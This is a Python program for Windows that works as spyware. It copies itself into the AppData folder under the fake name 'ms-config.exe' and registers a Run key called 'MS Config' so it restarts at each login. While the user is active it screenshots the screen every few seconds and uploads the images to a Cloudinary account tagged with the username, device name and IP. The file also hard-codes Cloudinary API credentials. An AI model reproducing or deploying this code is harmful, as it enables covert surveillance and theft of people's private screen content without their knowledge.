import pyautogui

from cloudinary import config
from cloudinary.uploader import upload
from datetime import datetime
from mouse import get_position
from os import path, getlogin, makedirs, remove, getenv
from platform import node, system
from pygetwindow import getActiveWindow
from pynput import keyboard
from socket import gethostbyname, gethostname
from shutil import copyfile
from sys import executable
from time import sleep
from winreg import (
    CloseKey,
    OpenKey,
    SetValueEx,
    HKEY_CURRENT_USER,
    KEY_SET_VALUE,
    REG_SZ,
)

config(
    cloud_name="dsnwguzkd",
    api_key="623166659259627",
    api_secret="hrxWwTWkKXg_tQYr-0NGlqsjWDE",
    secure=True,
)

INTERVAL = 5
USER_NAME = getlogin()
DEVICE_NAME = node()
try:
    IP_ADDRESS = gethostbyname(gethostname())
except:
    IP_ADDRESS = "Unkown"
OS_NAME = system()

SAVE_PATH = f"C:/Users/{USER_NAME}/AppData/local/Temp"
makedirs(SAVE_PATH, exist_ok=True)


def on_press(_):
    global keyboard_activity
    keyboard_activity = True


last_mouse_pos = (0, 0)
last_active_window = None
keyboard_activity = False

keyboard_listener = keyboard.Listener(on_press=on_press)
keyboard_listener.start()


def copy_to_roaming():
    roaming_path = getenv("APPDATA")
    new_path = path.join(roaming_path, "ms-config.exe")

    if not path.exists(new_path):
        try:
            copyfile(executable, new_path)
        except Exception as e:
            print(f"Error copiando a roaming: {e}")
    return new_path


def add_to_registry(exe_path):
    reg_key = HKEY_CURRENT_USER
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    name = "MS Config"

    try:
        key = OpenKey(reg_key, reg_path, 0, KEY_SET_VALUE)
        SetValueEx(key, name, 0, REG_SZ, exe_path)
        CloseKey(key)
    except Exception as e:
        print(f"Error agregando a registro: {e}")


def upload_to_cloudinary(filepath: str) -> None:
    file_name = filepath[len(SAVE_PATH) + 1 : -4]
    time_stamp = datetime.now().isoformat()
    upload(
        filepath,
        display_name=file_name,
        folder=f"screenshots/{USER_NAME}",
        tags=[USER_NAME, DEVICE_NAME],
        context={
            "user": USER_NAME,
            "device": DEVICE_NAME,
            "ip_address": IP_ADDRESS,
            "os_name": OS_NAME,
            "time_stamp": time_stamp,
        },
    )
    remove(filepath)


def user_is_active():
    global last_mouse_pos, last_active_window, keyboard_activity

    # Verificar movimiento del mouse
    current_mouse_pos = get_position()
    mouse_moved = current_mouse_pos != last_mouse_pos
    last_mouse_pos = current_mouse_pos

    # Verificar cambio de ventana activa
    try:
        current_window = getActiveWindow().title
    except:
        current_window = None

    window_changed = current_window != last_active_window
    last_active_window = current_window

    # Verificar teclado
    keyboard_used = keyboard_activity
    keyboard_activity = False

    return mouse_moved or window_changed or keyboard_used


def take_screenshot() -> None:
    while True:
        if not user_is_active():
            print("[…] Usuario inactivo, no se toma screenshot.")
            sleep(INTERVAL)
            continue

        filename = datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".jpg"
        filepath = path.join(SAVE_PATH, filename)

        screenshot = pyautogui.screenshot()
        screenshot = screenshot.convert("RGB")
        screenshot.save(filepath, "JPEG", quality=70, optimize=True)

        upload_to_cloudinary(filepath)
        print(f"[✔] Screenshot tomada por actividad: {filename}")
        sleep(INTERVAL)


if __name__ == "__main__":
    exe_path = copy_to_roaming()
    add_to_registry(exe_path)
    take_screenshot()
